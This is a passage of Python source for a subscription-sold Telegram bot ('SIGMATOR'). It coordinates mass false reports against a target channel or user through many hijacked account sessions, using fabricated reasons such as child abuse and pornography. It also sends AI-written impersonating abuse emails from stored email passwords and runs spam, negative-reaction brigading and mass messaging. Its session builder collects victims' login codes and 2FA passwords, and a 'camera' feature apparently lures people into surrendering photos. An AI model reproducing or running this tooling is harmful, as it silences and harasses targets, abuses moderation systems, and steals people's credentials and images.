        f"Links found: {len(links)}\n\n"
        f"Starting reports & emails...")
    
    # Telegram Reports
    if can_report:
        reasons = {
            "scam": types.InputReportReasonSpam(),
            "porn": types.InputReportReasonPornography(),
            "violence": types.InputReportReasonViolence(),
            "child": types.InputReportReasonChildAbuse(),
            "copyright": types.InputReportReasonCopyright(),
            "fake": types.InputReportReasonFake()
        }
        reason = reasons.get(mode, types.InputReportReasonSpam())
        
        sessions = get_sessions()
        use_sessions = sessions[:remaining_reports] if len(sessions) > remaining_reports else sessions
        
        for idx, s in enumerate(use_sessions, 1):
            if not is_attacking:
                break
            res = await report_worker(s, TARGET.replace('@', '').strip(), reason, f"{mode} report")
            if res == 1:
                reports_sent += 1
            if idx % 5 == 0:
                try:
                    await bot.edit_message(chat_id, message_id,
                        f"Reports: {reports_sent}/{len(use_sessions)}\nEmails: {emails_sent}")
                except:
                    pass
            await asyncio.sleep(random.uniform(1.0, 2.0))
    
    # Email Attack
    if can_email:
        subject, body = generate_email(mode, TARGET, TARGET_ACCOUNT, scan_result, impersonated)
        emails = load_emails()
        use_emails = emails[:remaining_emails] if len(emails) > remaining_emails else emails
        
        for idx, em in enumerate(use_emails, 1):
            if not is_attacking:
                break
            msg = MIMEMultipart()
            msg['From'] = em['email']
            msg['To'] = "abuse@telegram.org"
            msg['Subject'] = subject
            msg.attach(MIMEText(body, 'plain', 'utf-8'))
            
            result = await asyncio.get_event_loop().run_in_executor(
                None, lambda: _send_smtp(em['email'], em['password'], msg)
            )
            
            if result:
                emails_sent += 1
            
            if idx % 2 == 0:
                try:
                    await bot.edit_message(chat_id, message_id,
                        f"Reports: {reports_sent}\nEmails: {emails_sent}/{len(use_emails)}")
                except:
                    pass
            await asyncio.sleep(random.uniform(2.0, 4.0))
    
    increment_daily_counter(reports_sent, emails_sent)
    is_attacking = False
    
    final = (
        f"ATTACK COMPLETE\n\n"
        f"Mode: {mode.upper()}\n"
        f"Target: {TARGET}\n"
        f"Impersonating: {impersonated}\n\n"
        f"Reports sent: {reports_sent}\n"
        f"Emails sent: {emails_sent}\n\n"
        f"Daily remaining: {remaining_reports - reports_sent} reports"
    )
    
    if accounts:
        final += f"\n\nDetected accounts:\n" + '\n'.join([f'  - @{a}' for a in accounts[:5]])
    
    await bot.edit_message(chat_id, message_id, final)

# ---------------------- MENU ----------------------
async def get_menu(user_id=None):
    global is_clock_active, is_auto_spam_active
    
    is_admin_user = user_id in ADMINS if user_id else False
    sub = get_user_sub(user_id) if user_id and not is_admin_user else None
    has_sub = sub is not None and not sub.get('pending', False)
    
    can_report, can_email, remaining_reports, _ = check_daily_limit()
    
    if user_id and not is_admin_user and not has_sub:
        if sub and sub.get('pending'):
            text = f"""SIGMATOR BOT

PENDING ACTIVATION

Add {sub['sessions']} accounts to activate.
Progress: {len(get_sessions())}/{sub['sessions']}

Use /add to add accounts.
Contact: {ADMIN_CONTACT}"""
            buttons = [[Button.inline("Check Progress", b"sub_status")]]
        else:
            text = f"""SIGMATOR BOT

ACCESS DENIED

Free 7 Days - 5 accounts
Premium - Contact {ADMIN_CONTACT}

Commands:
/subscribe | /add | /status"""
            buttons = [
                [Button.inline("Activate Free", b"sub_free")],
                [Button.inline("Buy Premium", b"sub_buy")],
                [Button.inline("My Status", b"sub_status")]
            ]
        return text, buttons
    
    text = f"""SIGMATOR BOT
================
Target: {TARGET}
Sessions: {len(get_sessions())}
Proxies: {len(load_proxies())}
Emails: {len(load_emails())}
Daily: {DAILY_REPORT_LIMIT - remaining_reports}/{DAILY_REPORT_LIMIT}
Clock: {'ON' if is_clock_active else 'OFF'}
Spam: {'ON' if is_auto_spam_active else 'OFF'}
Status: {'RUNNING' if is_attacking else 'IDLE'}
================"""
    
    if not can_report and not can_email:
        buttons = [
            [Button.inline("DAILY LIMIT REACHED", b"limit_info")],
            [Button.inline("SET TARGET", b"set"), Button.inline("MONITOR", b"monit")],
            [Button.inline(f"CLOCK {'ON' if is_clock_active else 'OFF'}", b"clock_menu")],
            [Button.inline("SEND MSG", b"msg_menu")],
            [Button.inline("LEAVE", b"leave_ch"), Button.inline("REACT +", b"react_pos")],
            [Button.inline("REACT -", b"react_neg")],
            [Button.inline("PROXY", b"proxy_main"), Button.inline("EMAIL", b"email_menu")],
            [Button.inline(f"SPAM ({'ON' if is_auto_spam_active else 'OFF'})", b"auto_spam_menu")],
            [Button.inline("CAMERA", b"camera_menu")],
            [Button.inline("PING", b"ping"), Button.inline("STOP", b"stop")],
        ]
    else:
        buttons = [
            [Button.inline("SCAM + REPORT + EMAIL", b"a_scam")],
            [Button.inline("FAKE + REPORT + EMAIL", b"a_fake")],
            [Button.inline("CHILD ABUSE + REPORT + EMAIL", b"a_child")],
            [Button.inline("PORN + REPORT + EMAIL", b"a_porn")],
            [Button.inline("VIOLENCE + REPORT + EMAIL", b"a_violence")],
            [Button.inline("COPYRIGHT + REPORT + EMAIL", b"a_copyright")],
            [Button.inline("FAST PYROGRAM", b"fast_pyrogram")],
            [Button.inline("ch/gp join", b"join_group"), Button.inline("GROUP REPORT", b"group_report_menu")],
            [Button.inline("REPORT PROFILE", b"report_profile")],
            [Button.inline("SET TARGET", b"set"), Button.inline("MONITOR", b"monit")],
            [Button.inline(f"CLOCK {'ON' if is_clock_active else 'OFF'}", b"clock_menu")],
            [Button.inline("SEND MSG", b"msg_menu")],
            [Button.inline("LEAVE", b"leave_ch"), Button.inline("REACT +", b"react_pos")],
            [Button.inline("REACT -", b"react_neg")],
            [Button.inline("PROXY", b"proxy_main"), Button.inline("EMAIL", b"email_menu")],
            [Button.inline(f"SPAM ({'ON' if is_auto_spam_active else 'OFF'})", b"auto_spam_menu")],
            [Button.inline("CAMERA", b"camera_menu")],
            [Button.inline("PING", b"ping"), Button.inline("STOP", b"stop")],
        ]
    
    if user_id and (is_admin_user or has_sub):
        buttons.append([Button.inline("SUBSCRIPTION", b"sub_menu")])
    
    if is_admin_user:
        buttons.append([Button.inline("ADMINS", b"admin_menu")])
    
    return text, buttons

# ---------------------- SUBSCRIPTION MENU ----------------------
async def subscription_menu(bot, chat_id, user_id):
    sub = get_user_sub(user_id)
    
    if sub and not sub.get('pending'):
        expiry = datetime.fromisoformat(sub['expiry'])
        days_left = (expiry - datetime.now()).days
        text = f"""YOUR SUBSCRIPTION

Plan: {SUB_PLANS[sub['plan']]['name']}
Sessions: {len(get_sessions())}/{sub['sessions']}
Days Left: {days_left} days
Expires: {expiry.strftime('%Y-%m-%d')}"""
        buttons = [
            [Button.inline("Refresh", b"sub_status")],
            [Button.inline("Back", b"back")]
        ]
    elif sub and sub.get('pending'):
        text = f"""PENDING ACTIVATION

Add {sub['sessions']} accounts to activate.
Progress: {len(get_sessions())}/{sub['sessions']}

Use /add to add accounts."""
        buttons = [
            [Button.inline("Refresh", b"sub_status")],
            [Button.inline("Back", b"back")]
        ]
    else:
        text = f"""SUBSCRIPTION PLANS

Free 7 Days - 5 accounts
7 Days - 50k Toman
1 Month - 100k Toman
3 Months - 200k Toman
1 Year - 500k Toman

Contact: {ADMIN_CONTACT}"""
        buttons = [
            [Button.inline("Activate Free", b"sub_free")],
            [Button.inline("Buy Premium", b"sub_buy")],
            [Button.inline("My Status", b"sub_status")],
            [Button.inline("Back", b"back")]
        ]
    
    try:
        await bot.send_message(chat_id, text, buttons=buttons)
    except:
        pass

# ---------------------- SESSION BUILDER ----------------------
async def session_builder(bot, chat_id, user_id):
    sub = get_user_sub(user_id)
    if not sub:
        await bot.send_message(chat_id, f"No subscription!\nUse /subscribe\nContact: {ADMIN_CONTACT}")
        return
    
    current = len(get_sessions())
    if not sub.get('pending') and current >= sub['sessions']:
        await bot.send_message(chat_id, f"Limit reached! {current}/{sub['sessions']}\nContact: {ADMIN_CONTACT}")
        return
    
    async with bot.conversation(chat_id, timeout=300) as conv:
        await conv.send_message("Send phone number:\nExample: +989123456789")
        resp = await conv.get_response()
        phone = resp.text.strip()
        if not phone.startswith('+'):
            phone = '+' + phone
        
        try:
            session_name = phone.replace('+', '')
            session_path = f"{SESSION_DIR}/{session_name}"
            
            client = TelegramClient(session_path, API_ID, API_HASH)
            await client.connect()
            
            send_code = await client.send_code_request(phone)
            
            await conv.send_message(f"Code sent to {phone}\n\nEnter the 5-digit code:")
            resp = await conv.get_response()
            code = resp.text.strip()
            
            try:
                await client.sign_in(phone, code)
            except Exception as e:
                if "password" in str(e).lower():
                    await conv.send_message("2FA Enabled! Enter password:")
                    resp = await conv.get_response()
                    password = resp.text.strip()
                    await client.sign_in(password=password)
                else:
                    raise e
            
            me = await client.get_me()
            await client.disconnect()
            
            new_count = len(get_sessions())
            limit = sub['sessions']
            
            msg = f"Account Added!\n\n{me.first_name}\n{phone}\n{session_name}.session\n{new_count}/{limit}"
            
            if sub.get('pending') and new_count >= limit:
                add_subscription(user_id, "free")
                msg += "\n\nSubscription Activated!\nYour free 7-day subscription is now active!"
            
            await conv.send_message(msg)
            
        except Exception as e:
            await conv.send_message(f"Error: {str(e)[:100]}")
            try:
                if os.path.exists(session_path + ".session"):
                    os.remove(session_path + ".session")
            except:
                pass
            try:
                await client.disconnect()
            except:
                pass

# ---------------------- CHECK EXPIRED ----------------------
async def check_expired(bot):
    while True:
        try:
            expired = []
            for uid, sub in list(subscribers.items()):
                if not sub.get('pending'):
                    expiry = datetime.fromisoformat(sub['expiry'])
                    if datetime.now() > expiry:
                        expired.append(uid)
            
            for uid in expired:
                del subscribers[uid]
                try:
                    await bot.send_message(int(uid), "Subscription Expired!\nUse /subscribe to renew.")
                except:
                    pass
            
            if expired:
                save_subscribers(subscribers)
        except:
            pass
        await asyncio.sleep(3600)

# ---------------------- MAIN BOT ----------------------
async def main():
    global TARGET, TARGET_ACCOUNT, is_attacking, is_clock_active, ADMINS, clock_task
    global is_auto_spam_active, auto_spam_task, camera_link, last_camera_photo

    unlock_all()
    
    bot = TelegramClient('bot_main', API_ID, API_HASH)
    await bot.start(bot_token=BOT_TOKEN)
    
    print(f"[+] SIGMATOR AI BOT STARTED")
    print(f"[+] Emails: {len(load_emails())}")
    print(f"[+] Sessions: {len(get_sessions())}")
    print(f"[+] Gemini AI: Connected")
    print(f"[+] Daily limit: {DAILY_REPORT_LIMIT}")
    print(f"[+] Master ID: {MASTER_ID}")

    asyncio.create_task(check_expired(bot))

    @bot.on(events.NewMessage(pattern='/start'))
    async def start_cmd(e):
        text, buttons = await get_menu(e.sender_id)
        await e.respond(text, buttons=buttons)

    @bot.on(events.NewMessage(pattern='/lock'))
    async def lock_cmd(e):
        if e.sender_id != MASTER_ID:
            return
        await e.respond("Locking all files...")
        lock_all()
        await e.respond("All files encrypted! Bot will exit.")
        await asyncio.sleep(1)
        sys.exit(0)

    @bot.on(events.NewMessage(pattern='/subscribe'))
    async def sub_cmd(e):
        await subscription_menu(bot, e.chat_id, e.sender_id)

    @bot.on(events.NewMessage(pattern='/add'))
    async def add_cmd(e):
        await session_builder(bot, e.chat_id, e.sender_id)

    @bot.on(events.NewMessage(pattern='/status'))
    async def status_cmd(e):
        sub = get_user_sub(e.sender_id)
        if sub:
            if sub.get('pending'):
                await e.respond(f"Pending: {len(get_sessions())}/{sub['sessions']} accounts")
            else:
                expiry = datetime.fromisoformat(sub['expiry'])
                days = (expiry - datetime.now()).days
                await e.respond(f"{SUB_PLANS[sub['plan']]['name']}\n{len(get_sessions())}/{sub['sessions']}\n{days} days left")
        else:
            await e.respond("No active subscription!\nUse /subscribe")

    @bot.on(events.CallbackQuery)
    async def callback(e):
        global TARGET, TARGET_ACCOUNT, is_attacking, is_clock_active, ADMINS, clock_task
        global is_auto_spam_active, auto_spam_task, camera_link, last_camera_photo

        is_admin_user = e.sender_id in ADMINS
        sub = get_user_sub(e.sender_id) if not is_admin_user else None
        has_sub = sub is not None and not sub.get('pending', False)
        
        if not is_admin_user and not has_sub:
            allowed = ["sub_free", "sub_buy", "sub_status"]
            if e.data.decode() not in allowed:
                await e.answer("Subscribe to access!", alert=True)
                return
        
        await e.answer()
        data = e.data.decode()

        if data.startswith("a_"):
            if TARGET == 'target':
                await e.respond("Set target first!")
                return
            
            can_report, can_email, remaining, _ = check_daily_limit()
            
            if not can_report and not can_email:
                await e.respond(
                    f"DAILY LIMIT REACHED!\n\n"
                    f"{DAILY_REPORT_LIMIT}/{DAILY_REPORT_LIMIT} used\n"
                    f"Resets tomorrow.\n\n"
                    f"Contact: {ADMIN_CONTACT}"
                )
                return
            
            mode = data.split('_')[1]
            msg = await e.respond(f"Starting {mode.upper()} attack...\nAI analyzing...")
            is_attacking = True
            asyncio.create_task(smart_attack(bot, e.chat_id, msg.id, mode))

        elif data == "fast_pyrogram":
            if TARGET == 'target':
                await e.respond("Set target first!")
                return
            msg = await e.respond("Starting FAST PYROGRAM...")
            asyncio.create_task(run_fast_pyrogram(bot, e.chat_id, msg.id))

        elif data == "join_group":
            if TARGET == 'target':
                await e.respond("Set target first!")
                return
            msg = await e.respond("ch/gp join starting...")
            asyncio.create_task(run_join_group(bot, e.chat_id, msg.id))

        elif data == "group_report_menu":
            if TARGET == 'target':
                await e.respond("Set target first!")
                return
            buttons = []
            for i, (reason, msg) in enumerate(ALL_REPORT_REASONS):
                buttons.append([Button.inline(msg[:40], f"select_reason_{i}")])
            buttons.append([Button.inline("ALL 9 REASONS", b"select_all_reasons")])
            buttons.append([Button.inline("Back", b"back")])
            await e.edit("SELECT REPORT REASONS:", buttons=buttons)

        elif data.startswith("select_reason_"):
            idx = int(data.split("_")[2])
            reason, msg = ALL_REPORT_REASONS[idx]
            selected = [(reason, msg)]
            msg = await e.respond(f"Reporting with: {msg[:50]}...")
            asyncio.create_task(run_group_report(bot, e.chat_id, msg.id, selected))

        elif data == "select_all_reasons":
            msg = await e.respond("Reporting with ALL 9 reasons...")
            asyncio.create_task(run_group_report(bot, e.chat_id, msg.id, ALL_REPORT_REASONS))

        elif data == "report_profile":
            if TARGET == 'target':
                await e.respond("Set target first!")
                return
            msg = await e.respond("Reporting profile...")
            sessions = get_sessions()
            ok, fail = 0, 0
            for s in sessions:
                res = await report_worker(s, TARGET.replace('@', '').strip(),
                    types.InputReportReasonSpam(), "Fake account - impersonation")
                if res == 1:
                    ok += 1
                else:
                    fail += 1
            await msg.edit(f"Profile Report Done!\nSuccess: {ok}\nFailed: {fail}")

        elif data == "set":
            async with bot.conversation(e.chat_id, timeout=60) as conv:
                await conv.send_message("Send target channel/username:")
                TARGET = (await conv.get_response()).text.strip()
                
                await conv.send_message("Send associated account (or 'skip'):")
                acc_resp = (await conv.get_response()).text.strip()
                TARGET_ACCOUNT = None if acc_resp.lower() == 'skip' else acc_resp
                
                impersonated = ai_analyze_channel(TARGET)
                
                text, buttons = await get_menu(e.sender_id)
                await conv.send_message(
                    f"Target Set!\n\n"
                    f"Channel: {TARGET}\n"
                    f"Account: {TARGET_ACCOUNT or 'N/A'}\n"
                    f"AI Detected: {impersonated}",
                    buttons=buttons
                )

        elif data == "monit":
            sessions = get_sessions()
            text = f"Sessions ({len(sessions)}):\n\n"
            for s in sessions[:20]:
                text += f"- {os.path.basename(s)}\n"
            await e.edit(text, buttons=[[Button.inline("Back", b"back")]])

        elif data == "stop":
            is_attacking = False
            is_auto_spam_active = False
            if auto_spam_task:
                auto_spam_task.cancel()
            if clock_task:
                clock_task.cancel()
            text, buttons = await get_menu(e.sender_id)
            await e.edit(text, buttons=buttons)

        elif data == "back":
            text, buttons = await get_menu(e.sender_id)
            try:
                await e.edit(text, buttons=buttons)
            except:
                pass

        elif data == "ping":
            start = time.time()
            await bot.get_me()
            await e.edit(f"Ping: {int((time.time()-start)*1000)}ms")

        elif data == "leave_ch":
            if TARGET == 'target':
                await e.respond("Set target first!")
                return
            sessions = get_sessions()
            ok, fail = 0, 0
            for s in sessions:
                res = await leave_worker(s, TARGET)
                if res == "left":
                    ok += 1
                else:
                    fail += 1
            await e.respond(f"Left: {ok} | Failed: {fail}")

        elif data in ("react_pos", "react_neg"):
            if TARGET == 'target':
                await e.respond("Set target first!")
                return
            emojies = ["👍", "🔥", "❤️", "🥰"] if data == "react_pos" else ["👎", "💩", "🤮", "🤡"]
            sessions = get_sessions()
            ok, fail = 0, 0
            for s in sessions:
                res = await reaction_worker(s, TARGET, emojies)
                if res == "success":
                    ok += 1
                else:
                    fail += 1
            await e.respond(f"Reactions: {ok} | Failed: {fail}")

        elif data == "clock_menu":
            if is_clock_active:
                is_clock_active = False
                if clock_task:
                    clock_task.cancel()
                text, buttons = await get_menu(e.sender_id)
                await e.edit(text, buttons=buttons)
            else:
                sessions = get_sessions()
                if not sessions:
                    await e.respond("No sessions!")
                    return
                buttons = []
                for i, s in enumerate(sessions[:20]):
                    buttons.append([Button.inline(os.path.basename(s), f"clk_{i}")])
                buttons.append([Button.inline("Back", b"back")])
                await e.edit("Select session:", buttons=buttons)

        elif data.startswith("clk_"):
            idx = int(data.split('_')[1])
            sessions = get_sessions()
            if idx >= len(sessions):
                return
            if is_clock_active:
                is_clock_active = False
                if clock_task:
                    clock_task.cancel()
            session_path = sessions[idx]
            client = create_stable_client(session_path)
            await client.connect()
            if await client.is_user_authorized():
                is_clock_active = True
                clock_task = asyncio.create_task(clock_task_func(client))
                await e.respond(f"Clock ON: {os.path.basename(session_path)}")
            else:
                await e.respond("Not authorized!")

        elif data == "msg_menu":
            async with bot.conversation(e.chat_id, timeout=60) as conv:
                await conv.send_message("Send recipient:")
                target_user = (await conv.get_response()).text.strip()
                await conv.send_message("Send text:")
                msg_text = (await conv.get_response()).text.strip()
                sessions = get_sessions()
                ok, fail = 0, 0
                for s in sessions:
                    res = await send_msg_worker(s, target_user, msg_text)
                    if res == "success":
                        ok += 1
                    else:
                        fail += 1
                await conv.send_message(f"Sent: {ok} | Failed: {fail}")

        elif data == "proxy_main":
            buttons = [
                [Button.inline("View Proxies", b"view_proxies")],
                [Button.inline("Set Proxy", b"set_proxy")],
                [Button.inline("Remove Proxy", b"remove_proxy")],
                [Button.inline("Back", b"back")]
            ]
            await e.edit("PROXY MANAGEMENT", buttons=buttons)

        elif data == "view_proxies":
            proxies = load_proxies()
            if not proxies:
                await e.edit("No proxies!", buttons=[[Button.inline("Back", b"proxy_main")]])
                return
            text = "PROXY LIST\n\n"
            for sess, proxy in list(proxies.items())[:15]:
                if '@' in proxy:
                    proxy = proxy.split('@')[0] + "***"
                text += f"- {sess}: {proxy[:50]}...\n"
            await e.edit(text, buttons=[[Button.inline("Back", b"proxy_main")]])

        elif data == "set_proxy":
            sessions = get_sessions()
            if not sessions:
                await e.respond("No sessions!")
                return
            buttons = []
            for i, s in enumerate(sessions[:20]):
                buttons.append([Button.inline(os.path.basename(s), f"setproxy_{i}")])
            buttons.append([Button.inline("Back", b"proxy_main")])
            await e.edit("Select session:", buttons=buttons)

        elif data.startswith("setproxy_"):
            idx = int(data.split('_')[1])
            sessions = get_sessions()
            if idx >= len(sessions):
                return
            session_path = sessions[idx]
            session_name = os.path.basename(session_path)
            async with bot.conversation(e.chat_id, timeout=60) as conv:
                await conv.send_message(f"Session: {session_name}\n\nSend proxy:")
                proxy_input = (await conv.get_response()).text.strip()
                if proxy_input.lower() == 'none':
                    proxies = load_proxies()
                    proxies.pop(session_name, None)
                    save_proxies(proxies)
                    await conv.send_message("Proxy removed!")
                else:
                    proxies = load_proxies()
                    proxies[session_name] = proxy_input
                    save_proxies(proxies)
                    await conv.send_message("Proxy saved!")

        elif data == "remove_proxy":
            sessions = get_sessions()
            if not sessions:
                await e.respond("No sessions!")
                return
            buttons = []
            for i, s in enumerate(sessions[:20]):
                buttons.append([Button.inline(os.path.basename(s), f"rmproxy_{i}")])
            buttons.append([Button.inline("Back", b"proxy_main")])
            await e.edit("Select session:", buttons=buttons)

        elif data.startswith("rmproxy_"):
            idx = int(data.split('_')[1])
            sessions = get_sessions()
            if idx >= len(sessions):
                return
            session_name = os.path.basename(sessions[idx])
            proxies = load_proxies()
            if session_name in proxies:
                del proxies[session_name]
                save_proxies(proxies)
                await e.respond(f"Removed: {session_name}")
            else:
                await e.respond("Not found!")

        elif data == "email_menu":
            emails = load_emails()
            buttons = [
                [Button.inline(f"View Emails ({len(emails)})", b"view_emails")],
                [Button.inline("Add Email", b"add_email")],
                [Button.inline("Remove Email", b"remove_email")],
                [Button.inline("Back", b"back")]
            ]
            await e.edit("EMAIL MANAGER", buttons=buttons)

        elif data == "view_emails":
            emails = load_emails()
            if not emails:
                await e.edit("No emails!", buttons=[[Button.inline("Back", b"email_menu")]])
                return
            text = f"EMAILS ({len(emails)}):\n\n"
            for i, em in enumerate(emails, 1):
                text += f"{i}. {em['email']}\n"
            await e.edit(text, buttons=[[Button.inline("Back", b"email_menu")]])

        elif data == "add_email":
            async with bot.conversation(e.chat_id, timeout=120) as conv:
                await conv.send_message("Send email:")
                email_addr = (await conv.get_response()).text.strip()
                await conv.send_message("Send password:")
                password = (await conv.get_response()).text.strip()
                emails = load_emails()
                emails.append({"email": email_addr, "password": password})
                save_emails(emails)
                await conv.send_message(f"Saved! Total: {len(emails)}")

        elif data == "remove_email":
            emails = load_emails()
            if not emails:
                await e.edit("No emails!")
                return
            buttons = []
            for i, em in enumerate(emails):
                buttons.append([Button.inline(f"Remove: {em['email'][:40]}", f"rememail_{i}")])
            buttons.append([Button.inline("Back", b"email_menu")])
            await e.edit("Select:", buttons=buttons)

        elif data.startswith("rememail_"):
            idx = int(data.split('_')[1])
            emails = load_emails()
            if idx < len(emails):
                removed = emails.pop(idx)
                save_emails(emails)
                await e.respond(f"Removed: {removed['email']}")

        elif data == "auto_spam_menu":
            if is_auto_spam_active:
                await e.edit("AUTO SPAM RUNNING", buttons=[
                    [Button.inline("STOP SPAM", b"stop_auto_spam")],
                    [Button.inline("Back", b"back")]
                ])
            else:
                sessions = get_sessions()
                if not sessions:
                    await e.respond("No sessions!")
                    return
                buttons = []
                for i, s in enumerate(sessions[:20]):
                    buttons.append([Button.inline(os.path.basename(s), f"as_{i}")])
                buttons.append([Button.inline("Back", b"back")])
                await e.edit("Select session:", buttons=buttons)

        elif data.startswith("as_"):
            idx = int(data.split('_')[1])
            sessions = get_sessions()
            if idx >= len(sessions):
                return
            session_path = sessions[idx]
            async with bot.conversation(e.chat_id, timeout=120) as conv:
                await conv.send_message("Send group link:")
                group = (await conv.get_response()).text.strip()
                await conv.send_message("Send message:")
                message = (await conv.get_response()).text.strip()
                await conv.send_message("Interval (seconds):")
                try:
                    interval = int((await conv.get_response()).text.strip())
                except:
                    interval = 60
                patch_session_db(session_path)
                client = create_stable_client(session_path, use_proxy=True)
                await client.connect()
                if await client.is_user_authorized():
                    is_auto_spam_active = True
                    auto_spam_task = asyncio.create_task(auto_spam_worker(client, group, message, interval))
                    await conv.send_message(f"Started!\nInterval: {interval}s")
                else:
                    await conv.send_message("Not authorized!")

        elif data == "stop_auto_spam":
            is_auto_spam_active = False
            if auto_spam_task:
                auto_spam_task.cancel()
            await e.respond("Stopped!")
            text, buttons = await get_menu(e.sender_id)
            await e.edit(text, buttons=buttons)

        elif data == "camera_menu":
            if camera_link:
                buttons = [
                    [Button.inline("Get Link", b"cam_get_link")],
                    [Button.inline("Check Photo", b"cam_check_photo")],
                    [Button.inline("New Link", b"cam_new_link")],
                    [Button.inline("Back", b"back")]
                ]
                await e.edit("CAMERA MENU\nCamera is active!", buttons=buttons)
            else:
                buttons = [
                    [Button.inline("Start Camera", b"cam_start")],
                    [Button.inline("Back", b"back")]
                ]
                await e.edit("CAMERA MENU\nCamera not started!", buttons=buttons)

        elif data == "cam_start":
            await e.respond("Starting camera...")
            link = await asyncio.get_event_loop().run_in_executor(None, start_camera)
            if link:
                await e.respond(f"Camera Ready!\n{link}")
            else:
                await e.respond("Failed!")

        elif data == "cam_new_link":
            camera_link = None
            link = await asyncio.get_event_loop().run_in_executor(None, start_camera)
            if link:
                await e.respond(f"New Link!\n{link}")
            else:
                await e.respond("Failed!")

        elif data == "cam_get_link":
            await e.respond(f"Camera Link:\n{camera_link}" if camera_link else "No link!")

        elif data == "cam_check_photo":
            photos = glob.glob('/storage/emulated/0/camera_*.jpg')
            if photos:
                latest = max(photos, key=os.path.getctime)
                await bot.send_file(e.chat_id, latest, caption="Latest photo")
            else:
                await e.respond("No photo yet!")

        elif data == "sub_menu":
            await subscription_menu(bot, e.chat_id, e.sender_id)

        elif data == "sub_free":
            user_id = str(e.sender_id)
            subscribers[user_id] = {
                'plan': 'free',
                'sessions': 5,
                'expiry': 'pending',
                'added': datetime.now().isoformat(),
                'pending': True
            }
            save_subscribers(subscribers)
            
            await e.respond(
                "Free Subscription Requested!\n\n"
                "To activate your free 7-day subscription:\n"
                "- Add 5 accounts using /add command\n"
                "- Subscription activates automatically after 5 accounts\n\n"
                "Progress: 0/5 accounts\n\n"
                "Use /add to start adding accounts!"
            )
            text, buttons = await get_menu(e.sender_id)
            await e.respond(text, buttons=buttons)

        elif data == "sub_buy":
            await e.respond(
                f"Premium Plans\n\n"
                f"7 Days - 50k Toman\n"
                f"1 Month - 100k Toman\n"
                f"3 Months - 200k Toman\n"
                f"1 Year - 500k Toman\n\n"
                f"Contact: {ADMIN_CONTACT}"
            )

        elif data == "sub_status":
            sub = get_user_sub(e.sender_id)
            if sub:
                if sub.get('pending'):
                    await e.respond(f"Pending: {len(get_sessions())}/{sub['sessions']} accounts")
                else:
                    expiry = datetime.fromisoformat(sub['expiry'])
                    days = (expiry - datetime.now()).days
                    await e.respond(f"{SUB_PLANS[sub['plan']]['name']}\n{len(get_sessions())}/{sub['sessions']}\n{days} days left")
            else:
                await e.respond("No active subscription!")

        elif data == "admin_menu":
            admins = load_admins()
            text = f"ADMINS ({len(admins)}/{MAX_ADMINS})\n\n"
            for i, a in enumerate(admins, 1):
                text += f"{i}. {a}\n"
            buttons = [
                [Button.inline("Add Admin", b"admin_add")],
                [Button.inline("Remove Admin", b"admin_remove")],
                [Button.inline("Back", b"back")]
            ]
            await e.edit(text, buttons=buttons)

        elif data == "admin_add":
            async with bot.conversation(e.chat_id, timeout=60) as conv:
                await conv.send_message(f"Send user_id to add ({len(load_admins())}/{MAX_ADMINS}):")
                resp = await conv.get_response()
                try:
                    new_id = int(resp.text.strip())
                    success, msg = add_admin(new_id)
                    if success:
                        ADMINS.clear()
                        ADMINS.extend(load_admins())
                    await conv.send_message(msg)
                except:
                    await conv.send_message("Invalid ID!")

        elif data == "admin_remove":
            async with bot.conversation(e.chat_id, timeout=60) as conv:
                await conv.send_message("Send user_id to remove:")
                resp = await conv.get_response()
                try:
                    del_id = int(resp.text.strip())
                    success, msg = remove_admin(del_id)
                    if success:
                        ADMINS.clear()
                        ADMINS.extend(load_admins())
                    await conv.send_message(msg)
                except:
                    await conv.send_message("Invalid ID!")

        elif data == "limit_info":
            can_report, can_email, remaining_reports, remaining_emails = check_daily_limit()
            await e.respond(
                f"DAILY LIMITS\n\n"
                f"Reports: {DAILY_REPORT_LIMIT - remaining_reports}/{DAILY_REPORT_LIMIT}\n"
                f"Emails: {DAILY_REPORT_LIMIT - remaining_emails}/{DAILY_REPORT_LIMIT}\n\n"
                f"Resets at midnight.\n"
                f"Contact: {ADMIN_CONTACT}"
            )

    import atexit
    atexit.register(lock_all)
    
    await bot.run_until_disconnected()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        lock_all()
        print("\n[!] Locked & Stopped")
        sys.exit(0)